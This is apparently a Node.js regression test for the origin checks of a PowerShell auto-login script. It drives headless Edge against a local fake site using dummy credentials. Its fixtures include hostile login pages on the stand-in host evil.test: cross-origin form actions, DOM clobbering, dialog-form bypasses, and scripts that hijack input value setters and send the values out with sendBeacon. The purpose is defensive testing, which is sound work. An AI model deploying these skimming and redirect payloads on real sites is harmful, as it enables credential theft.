// go.ps1 자동 로그인의 origin 경계 회귀 테스트. 실제 go.ps1 에서 꺼낸 코드를 돌린다:
//   - $fill 입력 스크립트 → 로컬 헤드리스 Edge (가짜 사이트 = 127.0.0.1 임시 포트, 호스트 이름은 --host-resolver-rules 로 전부 127.0.0.1)
//   - LoginUrlMode 함수 → Windows PowerShell 5.1 (빌린 PC 기본)
// 게이트웨이·실제 사이트·비밀 값은 쓰지 않는다 (더미 값만).  node test/login-origin-security.mjs

import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import { createServer as createNetServer } from 'node:net';
import { chromium } from 'playwright-core';

const SRC = readFileSync(new URL('../src/go.ps1', import.meta.url), 'utf8');
const FILL = SRC.match(/\$fill = @'\n([\s\S]*?)\n'@/)[1];
const U = 'dummy-user@example.test', PW = 'dummy-PW-9f3k!';

let pass = 0, failN = 0;
const check = (name, cond, extra = '') => {
  if (cond) { pass++; console.log(`  ok   ${name}`); }
  else { failN++; console.log(`  FAIL ${name} ${extra}`); }
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── LoginUrlMode (PowerShell) ──
console.log('\n# LoginUrlMode (Windows PowerShell 5.1)');
{
  const PROD = 'https://k.shinick.dev', DEV = 'http://localhost:8797';
  const cases = [
    ['', PROD, 'none'],
    ['https://login.example.com/x', PROD, 'https'],
    ['HTTPS://Login.Example.com:8443/x', PROD, 'https'],
    ['http://login.example.com/', PROD, 'bad'],
    ['http://localhost:8798/one', PROD, 'bad'],          // 운영 게이트웨이에는 loopback 예외 없음
    ['http://localhost:8798/one', DEV, 'dev-http'],
    ['http://127.0.0.1:8798/one', DEV, 'dev-http'],
    ['http://login.example.com/', DEV, 'bad'],           // 개발 예외도 loopback 대상만
    ['http://localhost.evil.test/', DEV, 'bad'],
    ['http://localhost:8798/', 'http://gw.evil.test', 'bad'],
    ['https://user:pw@login.example.com/', PROD, 'bad'],
    ['https://user@login.example.com/', PROD, 'bad'],
    ['/relative/login', PROD, 'bad'],
    ['login.example.com', PROD, 'bad'],
    ['javascript:alert(1)', PROD, 'bad'],
    ['ftp://login.example.com/', PROD, 'bad'],
  ];
  const ps = `$ErrorActionPreference='Stop'
$t = [IO.File]::ReadAllText('${fileURLToPath(new URL('../src/go.ps1', import.meta.url)).replace(/'/g, "''")}', [Text.Encoding]::UTF8)
$e = $null; $ast = [Management.Automation.Language.Parser]::ParseInput($t, [ref]$null, [ref]$e)
if ($e.Count) { throw 'parse errors' }
$f = $ast.Find({ param($n) $n -is [Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq 'LoginUrlMode' }, $true)
. ([scriptblock]::Create($f.Extent.Text))
$cases = '${JSON.stringify(cases).replace(/'/g, "''")}' | ConvertFrom-Json
@($cases | ForEach-Object { LoginUrlMode $_[0] $_[1] }) | ConvertTo-Json -Compress`;
  const r = spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-EncodedCommand', Buffer.from(ps, 'utf16le').toString('base64')], { encoding: 'utf8', timeout: 60000 });
  let got = [];
  try { got = JSON.parse(r.stdout.trim()); } catch { check('PowerShell 실행', false, r.stdout + r.stderr); }
  cases.forEach(([u, gw, want], i) => check(`LoginUrlMode(${JSON.stringify(u)}, ${gw}) = ${want}`, got[i] === want, `got ${got[i]}`));
}

// ── 가짜 사이트: 한 서버를 두 포트에 띄우고 Host 로 나눈다 ──
const hits = [];
let pA, pB;
const EVIL = () => `http://evil.test:${pB}`;
const handler = async (req, res) => {
  let body = '';
  for await (const c of req) body += c;
  const host = req.headers.host;
  hits.push({ host, url: req.url, body });
  const u = new URL(req.url, `http://${host}`);
  const html = (s) => { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(`<!doctype html><meta charset=utf-8><body>${s}`); };
  const go = (to) => { res.writeHead(302, { location: to }); res.end(); };
  const USER = `<input type=text name=username placeholder="아이디">`, PASS = `<input type=password name=password>`;
  switch (u.pathname) {
    case '/one': return html(`<form method=post action=/done>${USER}${PASS}<button type=submit>로그인</button></form>`);
    case '/start': return go('/one');                                      // 같은 origin 안의 경로 변경
    case '/two': return html(`<form method=get action=/two/pw><input type=email name=email autocomplete=username><button type=submit>다음</button></form>`);
    case '/two/pw': return html(`<form method=post action=/done>${PASS}<button>Sign in</button></form>`);
    case '/redir': return go(`${EVIL()}/one`);                             // 첫 이동에서 다른 origin 으로
    case '/jsnext': return html(`${USER}<button onclick="location='${EVIL()}/pwonly'">다음</button>`);
    case '/pwonly': return html(`<form method=post action=/done>${PASS}<button type=submit>로그인</button></form>`);
    case '/navuser': return html(`<form method=get action=/two/pw><input type=email name=email autocomplete=username oninput="setTimeout(()=>location='${EVIL()}/pwonly',50)"><button type=submit>다음</button></form>`);
    case '/navpw': return html(`<form method=post action=/done>${USER}<input type=password name=password oninput="setTimeout(()=>location='${EVIL()}/pwonly',50)"><button type=submit>로그인</button></form>`);
    case '/xaction': return html(`<form method=post action="${EVIL()}/done">${USER}${PASS}<button type=submit>로그인</button></form>`);
    case '/xformaction': return html(`<form method=post action=/done>${USER}${PASS}<button type=submit formaction="${EVIL()}/done">로그인</button></form>`);
    case '/clobber': return html(`<form method=post action="${EVIL()}/done"><input type=hidden name=action value="/done">${USER}${PASS}<button type=submit>로그인</button></form>`);
    case '/xuserform': return html(`<form method=get action="${EVIL()}/two/pw"><input type=email name=email autocomplete=username><button type=submit>다음</button></form>`);
    case '/xlink': return html(`${USER}${PASS}<a href="${EVIL()}/done">로그인</a>`);
    // 검토에서 재현된 우회 1: method=dialog 폼이지만 버튼 formmethod=post 가 다른 origin 으로 보낸다 (+ 변형)
    case '/dialogx': return html(`<form method=dialog action="${EVIL()}/done">${USER}${PASS}<button type=submit formmethod=post>로그인</button></form>`);
    case '/dialogfa': return html(`<form method=dialog>${USER}${PASS}<button formmethod=post formaction="${EVIL()}/done">로그인</button></form>`);
    case '/dialoguser': return html(`<form method=dialog action="${EVIL()}/two/pw"><input type=email name=email autocomplete=username><button formmethod=get>다음</button></form>`);
    case '/xformattr': return html(`<form id=g method=post action="${EVIL()}/done"><input type=hidden name=x value=1></form><form method=post action=/done>${USER}${PASS}<button type=submit form=g>로그인</button></form>`);
    case '/clobber2': return html(`<form method=post action="${EVIL()}/done"><input type=hidden name=getAttribute><input type=hidden name=hasAttribute>${USER}${PASS}<button type=submit>로그인</button></form>`);
    // 검토에서 재현된 우회 2: 리다이렉트된 악성 페이지가 window.URL 을 바꿔 "저장 주소 origin = 지금 origin" 으로 속인다
    case '/poisonredir': return go(`${EVIL()}/poison`);
    case '/poison': return html(`<script>
      const R = URL; window.URL = class extends R { get origin() { return location.origin; } };
      const d = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
      Object.defineProperty(HTMLInputElement.prototype, 'value', { configurable: true, get() { return d.get.call(this); },
        set(v) { if (v) navigator.sendBeacon('/steal', v); d.set.call(this, v); } });
    </script><form method=post action=/done>${USER}${PASS}<button type=submit>로그인</button></form>`);
    // 변형: URL 을 가짜 객체로, location 재정의 시도, 이벤트·제출 함수를 가로채 값 엿보기
    case '/poison2': return html(`<script>
      window.URL = function () { return { origin: location.origin, protocol: 'https:', hostname: 'x', username: '', password: '', href: location.href }; };
      try { Object.defineProperty(window, 'location', { get() { return { origin: 'http://login.test' }; } }); } catch {}
      try { Object.defineProperty(document, 'baseURI', { get() { return location.href; } }); } catch {}
      const de = EventTarget.prototype.dispatchEvent;
      EventTarget.prototype.dispatchEvent = function (e) { if (this.value) navigator.sendBeacon('/steal', this.value); return de.call(this, e); };
      Object.getOwnPropertyDescriptor = () => ({ set(v) { navigator.sendBeacon('/steal', v); } });
    </script><form method=post action=/done>${USER}${PASS}<button type=submit>로그인</button></form>`);
    // 정상(같은 origin) 대조군
    case '/dialogok': return html(`<form method=dialog>${USER}${PASS}<button formmethod=post formaction=/done>로그인</button></form>`);
    case '/twofa': return html(`<form method=get action=/nope><input type=email name=email autocomplete=username><button type=submit formaction=/two/pw>다음</button></form>`);
    case '/selfpoison': return html(`<script>window.URL = function () { throw new Error('polyfill'); }; Object.getOwnPropertyDescriptor = () => undefined;</script><form method=post action=/done>${USER}${PASS}<button type=submit>로그인</button></form>`);
    case '/done': return html('welcome');
  }
  res.writeHead(404); res.end();
};
const listen = () => new Promise((r) => { const s = createServer(handler); s.listen(0, '127.0.0.1', () => r(s)); });
const sA = await listen(), sB = await listen();
pA = sA.address().port; pB = sB.address().port;
const A = `http://login.test:${pA}`;

const DBG = await new Promise((r) => { const s = createNetServer().listen(0, '127.0.0.1', () => { const p = s.address().port; s.close(() => r(p)); }); });
const browser = await chromium.launch({ channel: 'msedge', headless: true, args: ['--host-resolver-rules=MAP * 127.0.0.1', `--remote-debugging-port=${DBG}`] });
const leaked = (fromIdx, ok) => hits.slice(fromIdx).filter((h) => !ok(h) && (decodeURIComponent(h.url + ' ' + h.body.replace(/\+/g, ' ')).includes(PW) || decodeURIComponent(h.url + ' ' + h.body).includes(U)));
const onA = (h) => h.host === `login.test:${pA}`;

// go.ps1 의 JsIso 와 같은 CDP 호출: 최상위 frame → 격리 world → 그 context 에서 evaluate (world: 'main' 은 고치기 전 방식, 픽스처 확인용)
async function evalIn(cdp, page, expr, world) {
  if (world === 'main') return page.evaluate(expr);
  const { frameTree } = await cdp.send('Page.getFrameTree');
  const { executionContextId } = await cdp.send('Page.createIsolatedWorld', { frameId: frameTree.frame.id, worldName: 'kvgo', grantUniveralAccess: false });
  const r = await cdp.send('Runtime.evaluate', { expression: expr, contextId: executionContextId, returnByValue: true, awaitPromise: true });
  if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception?.description);
  return r.result.value;
}

// go.ps1 의 재시도 루프와 같은 순서: 페이지가 뜨길 기다림 → 입력 스크립트 → 페이지가 바뀌어 죽으면 다음 페이지에서 이어서
async function drive(start, { loginUrl = start, allowHttp = true, world = 'iso', fill = FILL } = {}) {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const cdp = await ctx.newCDPSession(page);
  const from = hits.length;
  await page.goto(start, { timeout: 10000 }).catch(() => {});
  let result = null, skipU = false;
  for (let a = 0; a < 4 && !result; a++) {
    await sleep(500);
    await page.waitForLoadState('load', { timeout: 10000 }).catch(() => {});
    try {
      const r = await evalIn(cdp, page, `(${fill})(${JSON.stringify(loginUrl)},${allowHttp},${JSON.stringify(U)},${JSON.stringify(PW)},${skipU})`, world);
      if (['submitted', 'no-form', 'target', 'bad-url'].includes(r) || r.startsWith('origin:')) result = r;
      else if (r === 'username-only') skipU = true;
    } catch { skipU = true; }
  }
  await sleep(700);
  const final = page.url();
  const values = await page.evaluate(() => [...document.querySelectorAll('input:not([type=hidden])')].map((e) => e.value)).catch(() => []);
  await ctx.close();
  return { result, final, values, from };
}
const noSecretOnPage = (d) => !d.values.some((v) => v === PW || v === U);

console.log('\n# 정상: 같은 origin');
{
  let d = await drive(`${A}/one`);
  check('한 화면 로그인 제출', d.result === 'submitted' && hits.slice(d.from).some((h) => onA(h) && h.url === '/done' && h.body.includes('dummy-PW')), JSON.stringify(d));
  d = await drive(`${A}/two`);
  check('두 단계 로그인 (아이디 → 다음 → 비밀번호) 제출', d.result === 'submitted' && hits.slice(d.from).some((h) => onA(h) && h.url === '/done' && h.body.includes('dummy-PW')), JSON.stringify(d));
  d = await drive(`${A}/start`);
  check('같은 origin 안 경로 이동(302 /start → /one) 뒤 제출', d.result === 'submitted', JSON.stringify(d));
  d = await drive(`${A}/one`, { loginUrl: `HTTP://LOGIN.test:${pA}/other/path?x=1` });
  check('저장 주소의 대소문자·경로가 달라도 origin 이 같으면 제출', d.result === 'submitted', JSON.stringify(d));
  d = await drive(`${A}/dialogok`);
  check('같은 origin: method=dialog + 버튼 formmethod=post formaction=/done 제출', d.result === 'submitted' && hits.slice(d.from).some((h) => onA(h) && h.url === '/done' && h.body.includes('dummy-PW')), JSON.stringify(d));
  d = await drive(`${A}/twofa`);
  check('같은 origin: 두 단계 (다음 버튼 formaction=/two/pw) 제출', d.result === 'submitted' && hits.slice(d.from).some((h) => onA(h) && h.url === '/done' && h.body.includes('dummy-PW')), JSON.stringify(d));
  d = await drive(`${A}/selfpoison`);
  check('같은 origin 페이지가 URL·getOwnPropertyDescriptor 를 바꿔도 (격리 world) 제출', d.result === 'submitted' && hits.slice(d.from).some((h) => onA(h) && h.url === '/done' && h.body.includes('dummy-PW')), JSON.stringify(d));
  for (const h of ['127.0.0.1', 'localhost']) {
    const L = `http://${h}:${pA}`;
    d = await drive(`${L}/two`);
    check(`loopback 개발 주소 ${L}: 두 단계 로그인 제출`, d.result === 'submitted' && hits.slice(d.from).some((x) => x.host === `${h}:${pA}` && x.url === '/done' && x.body.includes('dummy-PW')), JSON.stringify(d));
  }
}

console.log('\n# 다른 origin: 아무것도 넣지 않음');
for (const [name, start, opt] of [
  ['첫 이동 리다이렉트로 다른 호스트', `${A}/redir`, {}],
  ['아이디 → (JS 이동) → 다른 호스트의 비밀번호 화면', `${A}/jsnext`, {}],
  ['아이디 입력 뒤 기다리는 사이 다른 호스트로 이동', `${A}/navuser`, {}],
  ['비밀번호 입력 뒤 제출 전 기다리는 사이 다른 호스트로 이동', `${A}/navpw`, {}],
  ['같은 호스트 다른 포트', `http://login.test:${pB}/one`, { loginUrl: `${A}/one` }],
  ['비슷한 호스트 (login.test.evil.test)', `http://login.test.evil.test:${pA}/one`, { loginUrl: `${A}/one` }],
  ['비슷한 호스트 (evil-login.test)', `http://evil-login.test:${pA}/one`, { loginUrl: `${A}/one` }],
  ['이름 대신 IP (127.0.0.1)', `http://127.0.0.1:${pA}/one`, { loginUrl: `${A}/one` }],
  ['https 저장 → http 페이지 (다운그레이드)', `${A}/one`, { loginUrl: `https://login.test:${pA}/one`, allowHttp: false }],
  ['[검토 우회 2] 리다이렉트된 다른 호스트가 window.URL 을 바꿔 origin 을 속임', `${A}/poisonredir`, {}],
  ['[변형] 다른 호스트가 URL·location·baseURI·dispatchEvent·getOwnPropertyDescriptor 를 바꿈', `${EVIL()}/poison2`, { loginUrl: `${A}/one` }],
]) {
  const d = await drive(start, opt);
  const leak = leaked(d.from, onA);
  check(`${name}: 멈춤(origin:…)`, typeof d.result === 'string' && d.result.startsWith('origin:'), JSON.stringify(d));
  check(`${name}: 다른 origin 에 값이 가지 않음`, !leak.length && (d.final.startsWith(A) || noSecretOnPage(d)), JSON.stringify({ leak, d }));
}

console.log('\n# 제출 대상이 다른 origin');
for (const [name, path, want] of [
  ['form action 이 다른 origin', '/xaction', 'target'],
  ['버튼 formaction 이 다른 origin', '/xformaction', 'target'],
  ['name=action 입력칸으로 가린 form action', '/clobber', 'target'],
  ['아이디 단계 폼이 다른 origin 으로', '/xuserform', 'target'],
  ['[검토 우회 1] method=dialog 폼 + 버튼 formmethod=post, action 이 다른 origin', '/dialogx', 'target'],
  ['[변형] method=dialog 폼 + 버튼 formmethod=post formaction 이 다른 origin', '/dialogfa', 'target'],
  ['[변형] 아이디 단계 method=dialog 폼 + 버튼 formmethod=get, action 이 다른 origin', '/dialoguser', 'target'],
  ['[변형] 폼 안 버튼의 form= 속성이 다른 origin 폼을 가리킴', '/xformattr', 'target'],
  ['[변형] name=getAttribute/hasAttribute 입력칸으로 가린 form', '/clobber2', 'target'],
]) {
  const d = await drive(`${A}${path}`);
  check(`${name}: ${want}, 입력칸 비어 있음`, d.result === want && noSecretOnPage(d), JSON.stringify(d));
  check(`${name}: 다른 origin 으로 요청 없음`, !hits.slice(d.from).some((h) => !onA(h)), JSON.stringify(hits.slice(d.from)));
}
{
  const d = await drive(`${A}/xlink`);
  check('다른 origin 으로 가는 "로그인" 링크는 누르지 않음', !hits.slice(d.from).some((h) => !onA(h)), JSON.stringify({ d, h: hits.slice(d.from) }));
}

console.log('\n# 쓸 수 없는 저장 주소 → 입력하지 않음');
for (const [loginUrl, allowHttp] of [
  [`http://u:p@login.test:${pA}/one`, true], ['/one', true], ['javascript:alert(1)', true], [`ftp://login.test:${pA}/`, true],
  [`${A}/one`, false],   // 개발용 http 예외가 없으면 http 는 안 됨
  ['', true],
]) {
  const d = await drive(`${A}/one`, { loginUrl, allowHttp });
  check(`${JSON.stringify(loginUrl)} (allowHttp=${allowHttp}) → bad-url`, d.result === 'bad-url' && noSecretOnPage(d) && !hits.slice(d.from).some((h) => h.url === '/done'), JSON.stringify(d));
}

// 픽스처가 검토의 두 우회를 실제로 재현하는지: 고치기 전 커밋(97a3312)의 $fill 을 고치기 전 방식(페이지 world)으로 돌리면 샌다
console.log('\n# 픽스처 확인: 고치기 전 코드는 이 페이지들에서 샌다');
{
  const r = spawnSync('git', ['show', '97a331212b36f1e890f67d3a6c4cc88ccbcf179a:src/go.ps1'], { encoding: 'utf8', cwd: fileURLToPath(new URL('..', import.meta.url)) });
  const OLD = r.status === 0 ? r.stdout.replace(/\r\n/g, '\n').match(/\$fill = @'\n([\s\S]*?)\n'@/)[1] : null;
  if (!OLD) check('이전 커밋의 go.ps1 읽기', false, r.stderr);
  else {
    for (const [name, start] of [['우회 1 (/dialogx)', `${A}/dialogx`], ['우회 2 (/poisonredir)', `${A}/poisonredir`]]) {
      const d = await drive(start, { world: 'main', fill: OLD });
      check(`이전 코드 + ${name}: 다른 origin 으로 샘 (재현됨)`, leaked(d.from, onA).length > 0, JSON.stringify(d));
    }
  }
}

// go.ps1 의 실제 Cdp·JsIso 함수(PowerShell 5.1)로 격리 world 실행: 악성 페이지는 멈추고, 정상 페이지는 제출
console.log('\n# go.ps1 JsIso (Windows PowerShell 5.1 + CDP)');
for (const [name, start, want] of [
  ['우회 2 페이지 (/poisonredir → evil)', `${A}/poisonredir`, (r) => r === `origin:${EVIL()}`],
  ['정상 한 화면 로그인 (/one)', `${A}/one`, (r) => r === 'submitted'],
]) {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const from = hits.length;
  await page.goto(start, { timeout: 10000 }).catch(() => {});
  await page.waitForLoadState('load').catch(() => {});
  const ps = `$ErrorActionPreference='Stop'
$t = [IO.File]::ReadAllText('${fileURLToPath(new URL('../src/go.ps1', import.meta.url)).replace(/'/g, "''")}', [Text.Encoding]::UTF8)
$e = $null; $ast = [Management.Automation.Language.Parser]::ParseInput($t, [ref]$null, [ref]$e)
if ($e.Count) { throw 'parse errors' }
foreach ($n in 'Cdp', 'Js', 'JsIso') {
  $f = $ast.Find({ param($x) $x -is [Management.Automation.Language.FunctionDefinitionAst] -and $x.Name -eq $n }.GetNewClosure(), $true)
  . ([scriptblock]::Create($f.Extent.Text))
}
$fill = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${Buffer.from(FILL).toString('base64')}'))
$want = '${page.url().replace(/'/g, "''")}'
$ws = @(Invoke-RestMethod 'http://127.0.0.1:${DBG}/json' | ForEach-Object { $_ } | Where-Object { $_.type -eq 'page' -and $_.url -eq $want })[0].webSocketDebuggerUrl
$sock = [Net.WebSockets.ClientWebSocket]::new()
$sock.ConnectAsync([Uri]$ws, [Threading.CancellationToken]::None).Wait()
$script:cid = 0
$arg = { param($x) if ($null -eq $x) { 'null' } else { ConvertTo-Json ([string]$x) -Compress } }
JsIso ("(" + $fill + ")(" + (& $arg '${start}') + ",true," + (& $arg '${U}') + "," + (& $arg '${PW}') + ",false)")`;
  const r = spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-EncodedCommand', Buffer.from(ps, 'utf16le').toString('base64')], { encoding: 'utf8', timeout: 60000 });
  await sleep(700);
  const out = r.stdout.trim();
  check(`${name}: ${out}`, want(out), r.stderr);
  if (start.endsWith('/poisonredir')) check(`${name}: 다른 origin 에 값이 가지 않음`, !leaked(from, onA).length, JSON.stringify(hits.slice(from)));
  else check(`${name}: 같은 origin 으로 제출됨`, hits.slice(from).some((h) => onA(h) && h.url === '/done' && h.body.includes('dummy-PW')), JSON.stringify(hits.slice(from)));
  await ctx.close();
}

await browser.close();
sA.close(); sB.close();
console.log(`\n${pass} passed, ${failN} failed\n`);
process.exit(failN ? 1 : 0);
